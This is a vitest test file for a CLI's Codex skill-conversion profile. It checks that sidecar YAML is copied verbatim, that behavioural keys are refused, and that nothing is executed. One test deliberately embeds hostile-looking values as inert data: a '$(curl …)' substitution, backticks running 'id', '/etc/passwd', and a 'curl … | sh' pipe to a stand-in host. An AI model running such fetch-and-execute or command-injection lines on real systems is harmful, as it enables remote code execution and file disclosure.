/**
 * The Codex source profile.
 *
 * The property under test: `--source codex` is the Agent Skills package contract
 * plus one product sidecar, and the sidecar's *content* decides whether the
 * conversion is refused — presentation metadata is carried opaquely, behaviour is
 * not carried at all.
 */
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

import { runCli } from '../src/cli/run.js';
import { CONVERSION_CODES } from '../src/schemas/conversion.js';
import {
  CODEX_CODES,
  CODEX_SIDECAR_BASENAME,
  CODEX_SOURCE_ID,
  CODEX_UPSTREAM_COMMIT,
  findCodexSidecar,
  inspectCodexSidecar,
} from '../src/sources/codex/codex-contract.js';
import { EXIT_SUCCESS, EXIT_VALIDATION_FAILED } from '../src/utils/exit-codes.js';

const repositoryRoot = process.cwd();
const codexFixtures = path.join(repositoryRoot, 'fixtures', 'sources', 'codex');

function fixture(name: string): string {
  return path.join(codexFixtures, name);
}

const temporaryRoots: string[] = [];

function temporaryRoot(): string {
  const root = mkdtempSync(path.join(tmpdir(), 'dsh-forge-codex-'));
  temporaryRoots.push(root);
  return root;
}

afterEach(() => {
  for (const root of temporaryRoots.splice(0)) {
    rmSync(root, { recursive: true, force: true });
  }
});

async function run(
  ...argv: string[]
): Promise<{ exitCode: number; stdout: string; stderr: string }> {
  let stdout = '';
  let stderr = '';
  const exitCode = await runCli({
    argv,
    stdout: (text) => {
      stdout += text;
    },
    stderr: (text) => {
      stderr += text;
    },
  });
  return { exitCode, stdout, stderr };
}

/** Builds a Codex skill directory with the given body frontmatter and sidecar. */
function codexSkill(
  name: string,
  frontmatterLines: readonly string[],
  sidecar?: string,
  files: Record<string, string> = {},
): string {
  const root = path.join(temporaryRoot(), name);
  mkdirSync(root, { recursive: true });
  writeFileSync(
    path.join(root, 'SKILL.md'),
    [
      '---',
      `name: ${name}`,
      'description: A test skill.',
      ...frontmatterLines,
      '---',
      '',
      '# Body',
      '',
    ].join('\n'),
  );
  if (sidecar !== undefined) {
    mkdirSync(path.join(root, 'agents'), { recursive: true });
    writeFileSync(path.join(root, 'agents', CODEX_SIDECAR_BASENAME), sidecar);
  }
  for (const [relative, content] of Object.entries(files)) {
    const absolute = path.join(root, relative);
    mkdirSync(path.dirname(absolute), { recursive: true });
    writeFileSync(absolute, content);
  }
  return root;
}

function convert(dir: string, out: string) {
  return run('convert', dir, '--source', CODEX_SOURCE_ID, '--target', 'dsh', '--out', out);
}

function assess(dir: string) {
  return run('assess', dir, '--source', CODEX_SOURCE_ID, '--target', 'dsh');
}

function listPackage(root: string): string[] {
  const found: string[] = [];
  const pending = [root];
  while (pending.length > 0) {
    const current = pending.pop();
    if (current === undefined) break;
    for (const entry of readdirSync(current, { withFileTypes: true })) {
      const absolute = path.join(current, entry.name);
      if (entry.isDirectory()) pending.push(absolute);
      else found.push(path.relative(root, absolute).split(path.sep).join('/'));
    }
  }
  return found.sort();
}

describe('codex contract', () => {
  it('pins the runtime it was derived from', () => {
    expect(CODEX_SOURCE_ID).toBe('codex');
    expect(CODEX_UPSTREAM_COMMIT).toBe('7f892275e31002f0422477c6219189284560e689');
    expect(CODEX_SIDECAR_BASENAME).toBe('openai.yaml');
  });

  it('resolves the documented sidecar location and nothing else', () => {
    const dir = codexSkill('located', [], 'interface: {}');
    expect(findCodexSidecar(dir)).toBe(path.join(dir, 'agents', 'openai.yaml'));

    // A sidecar somewhere else is not a sidecar.
    const elsewhere = codexSkill('elsewhere', [], undefined, { 'openai.yaml': 'interface: {}' });
    expect(findCodexSidecar(elsewhere)).toBeUndefined();
  });
});

describe('a Codex skill without a sidecar', () => {
  it('converts as an ordinary Agent Skills package', async () => {
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode, stdout } = await convert(fixture('codex-no-sidecar'), out);

    expect(exitCode).toBe(EXIT_SUCCESS);
    expect(stdout).toContain('Result: SUCCESS');
    expect(listPackage(out)).toEqual(['SKILL.md']);
  });

  it('reports the sidecar as ABSENT rather than omitting the section', async () => {
    const { stdout } = await assess(fixture('codex-no-sidecar'));

    expect(stdout).toContain('Codex Sidecar:');
    expect(stdout).toContain('ABSENT');
  });
});

describe('an interface-only sidecar', () => {
  it.each(['codex-interface-only', 'codex-interface-and-license'])('converts %s', async (name) => {
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode } = await convert(fixture(name), out);

    expect(exitCode).toBe(EXIT_SUCCESS);
  });

  it('carries the sidecar as an ordinary resource', async () => {
    const out = path.join(temporaryRoot(), 'generated');
    await convert(fixture('codex-interface-only'), out);

    expect(listPackage(out)).toEqual(['SKILL.md', 'agents/openai.yaml']);
  });

  it('copies the sidecar byte-for-byte, not re-serialized', async () => {
    const source = fixture('codex-interface-only');
    const out = path.join(temporaryRoot(), 'generated');
    await convert(source, out);

    const original = readFileSync(path.join(source, 'agents', 'openai.yaml'));
    const generated = readFileSync(path.join(out, 'agents', 'openai.yaml'));
    expect(generated).toEqual(original);
    // Comments and quoting survive, which a parse-and-re-emit would lose.
    const text = generated.toString('utf8');
    expect(text).toContain('# Product configuration for this skill.');
    expect(text).toContain("'Codex   Interface Only'");
  });

  it('keeps interface metadata out of the generated frontmatter', async () => {
    const out = path.join(temporaryRoot(), 'generated');
    await convert(fixture('codex-interface-only'), out);

    const text = readFileSync(path.join(out, 'SKILL.md'), 'utf8');
    for (const forbidden of [
      'display_name',
      'short_description',
      'brand_color',
      'default_prompt',
      'icon_small',
      'whenToUse',
    ]) {
      expect(text).not.toContain(forbidden);
    }
  });

  it('produces a package that is generically valid and DSH compatible with no warnings', async () => {
    const out = path.join(temporaryRoot(), 'generated');
    await convert(fixture('codex-interface-only'), out);

    const validate = await run('validate', out);
    const compat = await run('compat', out);

    expect(validate.exitCode).toBe(EXIT_SUCCESS);
    expect(compat.exitCode).toBe(EXIT_SUCCESS);
    expect(compat.stdout).toContain('Result: COMPATIBLE');
    expect(compat.stdout).toContain('Warnings: 0');
  });

  it('reports the sidecar as INTERFACE_ONLY and stays convertible', async () => {
    const { exitCode, stdout } = await assess(fixture('codex-interface-only'));

    expect(exitCode).toBe(EXIT_SUCCESS);
    expect(stdout).toContain('INTERFACE_ONLY');
    expect(stdout).toContain('Result:\nCONVERTIBLE');
  });
});

describe('an interface sidecar alongside a license declaration', () => {
  it('preserves both, in their own places', async () => {
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode } = await convert(fixture('codex-interface-and-license'), out);

    expect(exitCode).toBe(EXIT_SUCCESS);
    const text = readFileSync(path.join(out, 'SKILL.md'), 'utf8');
    expect(text).toContain('preservedSemantics:');
    expect(text).toContain('license: Apache-2.0');
    // The license is preserved in the tool envelope, never as a top-level key.
    expect(text).not.toMatch(/^license:/m);
    // And the sidecar is still its own untouched file.
    expect(listPackage(out)).toEqual(['SKILL.md', 'agents/openai.yaml']);
  });
});

describe('a behavioural sidecar is refused', () => {
  it.each([
    ['policy', 'codex-policy', CODEX_CODES.unsupportedBehaviour],
    ['dependencies', 'codex-dependencies', CODEX_CODES.unsupportedDependency],
  ])('refuses %s', async (_label, name, code) => {
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode, stdout } = await convert(fixture(name), out);

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain(code);
    expect(stdout).toContain('No output was created.');
    expect(existsSync(out)).toBe(false);
  });

  it('refuses an interface sidecar that also carries policy', async () => {
    const dir = codexSkill(
      'iface-and-policy',
      [],
      'interface:\n  display_name: "X"\npolicy:\n  allow_implicit_invocation: false\n',
    );
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode, stdout } = await convert(dir, out);

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain(CODEX_CODES.unsupportedBehaviour);
    expect(existsSync(out)).toBe(false);
  });

  it('refuses an interface sidecar that also carries dependencies', async () => {
    const dir = codexSkill(
      'iface-and-deps',
      [],
      'interface:\n  display_name: "X"\ndependencies:\n  tools:\n    - type: "mcp"\n',
    );
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode, stdout } = await convert(dir, out);

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain(CODEX_CODES.unsupportedDependency);
    expect(existsSync(out)).toBe(false);
  });

  it('refuses both behaviours together and reports both, sorted', async () => {
    const dir = codexSkill(
      'both',
      [],
      'policy:\n  allow_implicit_invocation: true\ndependencies:\n  tools: []\n',
    );
    const { exitCode, stdout } = await assess(dir);

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain(CODEX_CODES.unsupportedDependency);
    expect(stdout).toContain(CODEX_CODES.unsupportedBehaviour);
    // Sorted by code, so the report never depends on sidecar key order.
    // `UNSUPPORTED_CODEX_BEHAVIOR` precedes `UNSUPPORTED_CODEX_DEPENDENCY`.
    expect(stdout.indexOf(CODEX_CODES.unsupportedBehaviour)).toBeLessThan(
      stdout.indexOf(CODEX_CODES.unsupportedDependency),
    );
  });

  it('reports the package as valid and the semantics as refused', async () => {
    const { stdout } = await assess(fixture('codex-policy'));

    // The package is well-formed Codex; only the target cannot express it.
    expect(stdout).toContain('Source Contract:\nPASS');
    expect(stdout).toContain('Semantics:\nREFUSED');
    expect(stdout).toContain('Result:\nREFUSED');
    expect(stdout).not.toContain('SOURCE_INVALID');
  });

  it('refuses a key that is present even when its block is empty', async () => {
    // The runtime branches on the key's presence, not on its contents.
    const dir = codexSkill('empty-policy', [], 'interface:\n  display_name: "X"\npolicy: {}\n');
    const { exitCode } = await convert(dir, path.join(temporaryRoot(), 'generated'));

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
  });
});

describe('an unreadable or malformed sidecar is refused, never guessed at', () => {
  it('refuses a sidecar that is not valid YAML', async () => {
    const dir = codexSkill('bad-yaml', [], 'interface: [unclosed\n');
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode, stdout } = await convert(dir, out);

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain(CODEX_CODES.invalidSidecar);
    expect(existsSync(out)).toBe(false);
  });

  it('refuses a sidecar that is not a mapping', async () => {
    const dir = codexSkill('not-a-mapping', [], '- one\n- two\n');
    const { exitCode, stdout } = await assess(dir);

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain(CODEX_CODES.invalidSidecar);
  });

  it.each([
    ['unparseable', 'interface: [unclosed\n'],
    ['not a mapping', '- one\n- two\n'],
  ])('classifies a %s sidecar as UNREADABLE, not BEHAVIOURAL', (_label, raw) => {
    // A file that cannot be read declares no observable behaviour, so reporting it
    // as behavioural would assert something nobody established.
    const dir = codexSkill('unreadable', [], raw);
    const inspection = inspectCodexSidecar(dir);

    expect(inspection.kind).toBe('UNREADABLE');
    expect(inspection.behaviouralKeys).toEqual([]);
  });

  it('reports an unreadable sidecar without the behavioural explanation', async () => {
    const { stdout } = await assess(codexSkill('unreadable-report', [], 'interface: [unclosed\n'));

    expect(stdout).toContain('Codex Sidecar:\nUNREADABLE');
    expect(stdout).not.toContain('declares behaviour the target cannot express');
  });

  it('accepts an empty sidecar, which declares nothing at all', async () => {
    const dir = codexSkill('blank-sidecar', [], '# only a comment\n');
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode } = await convert(dir, out);

    expect(exitCode).toBe(EXIT_SUCCESS);
    expect(listPackage(out)).toEqual(['SKILL.md', 'agents/openai.yaml']);
  });
});

describe('unknown sidecar keys follow the runtime rather than an invented rule', () => {
  it('preserves an unknown top-level key instead of failing on it', async () => {
    // The pinned runtime deserializes the keys it knows and reads past the rest,
    // so an unknown key is not an error there and must not become one here.
    const dir = codexSkill(
      'unknown-key',
      [],
      'interface:\n  display_name: "X"\nfuture_thing:\n  a: b\n',
    );
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode } = await convert(dir, out);

    expect(exitCode).toBe(EXIT_SUCCESS);
    expect(readFileSync(path.join(out, 'agents', 'openai.yaml'), 'utf8')).toContain('future_thing');
  });

  it('classifies an unknown key as presentation, not behaviour', () => {
    const dir = codexSkill('unknown-only', [], 'something_new: true\n');
    const inspection = inspectCodexSidecar(dir);

    expect(inspection.kind).toBe('INTERFACE_ONLY');
    expect(inspection.topLevelKeys).toEqual(['something_new']);
  });
});

describe('interface field values are never interpreted by this profile', () => {
  it('accepts a sidecar the runtime would drop fields from', async () => {
    // Codex warns and drops an invalid icon path or brand colour; it does not
    // reject the skill. This profile mirrors that: the file is carried as-is.
    const dir = codexSkill(
      'runtime-lenient',
      [],
      'interface:\n  icon_large: "../../outside.png"\n  brand_color: "blue"\n',
    );
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode } = await convert(dir, out);

    expect(exitCode).toBe(EXIT_SUCCESS);
    expect(readFileSync(path.join(out, 'agents', 'openai.yaml'), 'utf8')).toContain('blue');
  });
});

describe('the sidecar is data and nothing else', () => {
  it('never fetches, probes or connects to a URL it finds', async () => {
    const dir = codexSkill(
      'url-skill',
      [],
      'dependencies:\n  tools:\n    - type: "mcp"\n      url: "https://example.invalid/mcp/"\n',
    );
    const { exitCode, stdout } = await assess(dir);

    // The refusal is about the dependency semantics; the URL is only parsed data.
    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain(CODEX_CODES.unsupportedDependency);
    // Never echoed back into the report.
    expect(stdout).not.toContain('example.invalid');
  });

  it.each([
    ['shell substitution', '$(curl example.invalid)\n'],
    ['backticks', '`id`\n'],
    ['a path-like value', '/etc/passwd\n'],
    ['a script-looking value', 'curl -s https://example.invalid | sh\n'],
  ])('treats %s as inert data', async (_label, malicious) => {
    const dir = codexSkill(
      'inert',
      [],
      `interface:\n  display_name: "X"\nnote: "${malicious.trim()}"\n`,
    );
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode } = await convert(dir, out);

    // Preserved verbatim, never executed and never interpreted.
    expect(exitCode).toBe(EXIT_SUCCESS);
    const carried = readFileSync(path.join(out, 'agents', 'openai.yaml'), 'utf8');
    expect(carried).toContain(malicious.trim());
  });

  it('leaves scripts as resources and never runs them', async () => {
    const dir = codexSkill('script-resource', [], 'interface:\n  display_name: "X"\n', {
      'scripts/trap.sh': '#!/bin/sh\ntouch INVALID-SKILL.md\n',
    });
    const out = path.join(temporaryRoot(), 'generated');
    const { exitCode } = await convert(dir, out);

    expect(exitCode).toBe(EXIT_SUCCESS);
    expect(listPackage(out)).toEqual(['SKILL.md', 'agents/openai.yaml', 'scripts/trap.sh']);
    expect(existsSync(path.join(repositoryRoot, 'INVALID-SKILL.md'))).toBe(false);
    expect(existsSync(path.join(out, 'INVALID-SKILL.md'))).toBe(false);
  });
});

describe('codex reuses the Agent Skills contract instead of restating it', () => {
  it('refuses a name that does not match its directory, with the shared code', async () => {
    const root = path.join(temporaryRoot(), 'mismatched');
    mkdirSync(root, { recursive: true });
    writeFileSync(
      path.join(root, 'SKILL.md'),
      '---\nname: different-name\ndescription: d\n---\n\n# B\n',
    );
    const { exitCode, stdout } = await assess(root);

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain('AGENT_SKILLS_NAME_DIRECTORY_MISMATCH');
  });

  it('refuses a missing entry with the shared package code', async () => {
    const root = path.join(temporaryRoot(), 'empty-dir');
    mkdirSync(root, { recursive: true });
    const { exitCode, stdout } = await assess(root);

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain('SOURCE_PACKAGE_MISSING_ENTRY');
  });

  it('reports the codex source name and no other', async () => {
    const { stdout } = await assess(fixture('codex-interface-only'));

    expect(stdout).toContain('Source:\ncodex');
  });

  it('refuses an unsupported target the same way every other source does', async () => {
    const { exitCode, stdout } = await run(
      'assess',
      fixture('codex-interface-only'),
      '--source',
      CODEX_SOURCE_ID,
      '--target',
      'claude',
    );

    expect(exitCode).toBe(EXIT_VALIDATION_FAILED);
    expect(stdout).toContain(CONVERSION_CODES.unsupportedTarget);
  });
});

describe('codex is selected explicitly and never guessed', () => {
  it('is advertised among the selectable sources', async () => {
    // The source option is per subcommand, so that is where the list must appear.
    const { exitCode, stdout } = await run('convert', '--help');

    expect(exitCode).toBe(EXIT_SUCCESS);
    expect(stdout).toContain('generic-local');
    expect(stdout).toContain('agent-skills');
    expect(stdout).toContain('codex');
  });

  it('leaves the generic path untouched for a Codex directory', async () => {
    // Without `--source`, a Codex package reads as an ordinary local skill.
    const out = path.join(temporaryRoot(), 'generic');
    const { exitCode } = await run(
      'convert',
      fixture('codex-interface-only'),
      '--target',
      'dsh',
      '--out',
      out,
    );

    expect(exitCode).toBe(EXIT_SUCCESS);
    // Generic mode does not classify the sidecar, so it reports no sidecar section.
    const { stdout } = await run('assess', fixture('codex-interface-only'), '--target', 'dsh');
    expect(stdout).not.toContain('Codex Sidecar:');
  });
});
